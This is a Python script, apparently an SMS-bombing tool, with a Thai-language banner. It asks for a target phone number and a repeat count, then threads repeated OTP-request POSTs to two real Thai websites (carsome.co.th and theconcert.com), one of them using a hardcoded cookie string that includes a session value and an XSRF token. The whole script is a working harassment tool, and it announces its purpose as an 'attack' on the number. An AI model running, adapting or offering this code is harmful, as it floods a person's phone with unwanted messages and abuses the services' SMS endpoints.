import requests,json
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
import colorama
os.system("clear")
print("""\033[1;96m
███╗░░██╗██╗███╗░░██╗██████╗
████╗░██║██║████╗░██║██╔═══╝
██╔██╗██║██║██╔██╗██║██████╗
██║╚████║██║██║╚████║██╔═══╝
██║░╚███║██║██║░╚███║██████╗
╚═╝░░╚══╝╚═╝╚═╝░░╚══╝╚═════╝""")
print("\033[1;96m╔════════╗")
print("\033[1;96m║ยินดีต้อนรับ║")
print("\033[1;96m╚════════╝")
print("")
print("\033[1;96m╔══════════════╗")
print("║\033[91mcredit\033[1;96m:ไนน์ เท็น║")
print("\033[1;96m╚══════════════╝")
print("")
print("\033[1;96m╔══════════════════╗")
phone = input("\033[1;96m║𝚙𝚑𝚘𝚗𝚎 :")
print("\033[1;96m╚══════════════════่่่่่่╝่่่่่่")
print("\033[1;96m╔══════════════════╗")
num = int(input("\033[1;96m║𝙽𝚞𝚖   :"))
print("\033[1;96m╚══════════════════่่่่่่╝่่่่่่")
time.sleep(1) 
print("\033[1;96m╔══════════════════════════╗")
print("\033[1;96m║เตรียมโจมตี"f"{phone}จำนวน"f"{num}!║")
print("\033[1;96m╚══════════════════════════╝")
print(": :")
print("╔═╗")
print("║3║")
print("╚═╝")
print(": :")
print("╔═╗")
print("║2║")
print("╚═╝")
print(": :")
print("╔═╗")
print("║1║")
print("╚═╝")
print(": :")
print("╔══════╗")
print("║เริ่มเลย║")
print("╚══════╝")
print("")
def api1():
        requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
        print ("\033[92m║โจมตี:"f"{phone}!║")

def api2():
        requests.post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.585009483.1666498861;_fbp=fb.1.1666498857900.1817580025;__gads=ID=57bcd0e8356bd60d-2231073b7bd7009f:T=1666498862:RT=1666498862:S=ALNI_MZZ5HD5tDiY5J8zZ19R9Vh_HAQvqA;lang=th__gpi=UID=00000b69a4473896:T=1666498862:RT=1666679632:S=ALNI_MYScoikZdnfLXmYXC8Qz49bQ9dRsw;_ga=GA1.2.746838137.1666498862;_gid=GA1.2.398254796.1666679633;_ga_N9T2LF0PJ1=GS1.1.1666679629.2.0.1666679635.0.0.0;adonis-session=f8d0ee8255a52c7bff97969814c73043N7L3c%2FUHknk21cT1zu6s9sVw0Nfnzls1cO0NHt2jo0TCglPKgHUL%2F4dDejEFQBa%2FszxzZss8ounj8txnRFrjZyyiPs9JZdEkRvrfVXAD1Ah6Kj7KENJbrNH9SSPo2dWi;XSRF-TOKEN=eb5825f9e673cda4c57d68cb86a0d51c5INCC3QXUwrBvj9K0JaW4dqbSH1ePCgPyIvjzjHtr4P02kfKy8EAXUiG%2BNqKLKz6WxXSBGJ%2BMsHfBdrKvFWY7hAAF58aDJlxGmnZotPFIZZX9zMqzxpFyPhwFgKcZYNf"})
        print ("\033[92m║โจมตี:"f"{phone}!║")

for i in range(num):
	threading.Thread(target=api1).start()
	threading.Thread(target=api2).start()